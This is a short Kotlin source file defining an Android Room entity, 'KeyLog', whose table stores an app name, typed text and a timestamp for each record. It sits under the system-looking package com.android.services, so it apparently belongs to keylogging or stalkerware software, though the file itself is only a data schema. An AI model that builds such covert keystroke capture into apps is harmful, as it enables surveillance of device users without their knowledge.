package com.android.services.db.entities

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.PrimaryKey
import java.util.*

@Entity(tableName = "key_log")
data class KeyLog(

    @PrimaryKey(autoGenerate = true) @ColumnInfo(name = "id") @Transient
    var id: Int,

    @ColumnInfo(name = "uniqueId")
    var uniqueId: String,

    @ColumnInfo(name = "app_name")
    var appName: String,

    @ColumnInfo(name = "typed_text")
    var data: String,

    @ColumnInfo(name = "datetime")
    var datetime: String,

    @ColumnInfo(name = "date")
    @Transient
    var date: Date,

    @ColumnInfo(name = "status")
    @Transient
    var status: Int
) {
    constructor() : this(0, "", "", "", "", Date(), 0)
}